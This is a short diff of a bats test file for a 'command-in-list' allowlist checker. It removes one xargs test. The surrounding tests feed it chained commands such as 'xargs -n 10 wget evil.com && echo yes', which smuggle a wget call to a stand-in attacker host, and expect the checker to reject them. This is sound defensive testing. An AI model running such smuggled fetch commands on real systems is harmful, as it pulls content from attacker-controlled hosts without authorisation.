@@ -15,10 +15,6 @@
   run command-in-list "xargs -n 10 wget evil.com && echo yes" -- "echo"
   [ $status -eq 1 ]
 }
-@test "xargs without arguments" {
-  run command-in-list "find . | xargs" -- "find"
-  [ $status -eq 0 ]
-}
 @test "xargs with multiple flags and complex command" {
   run command-in-list "find . | xargs -I {} -n 1 'echo {} && wget evil.com'" -- "find" "echo"
   [ $status -eq 1 ]
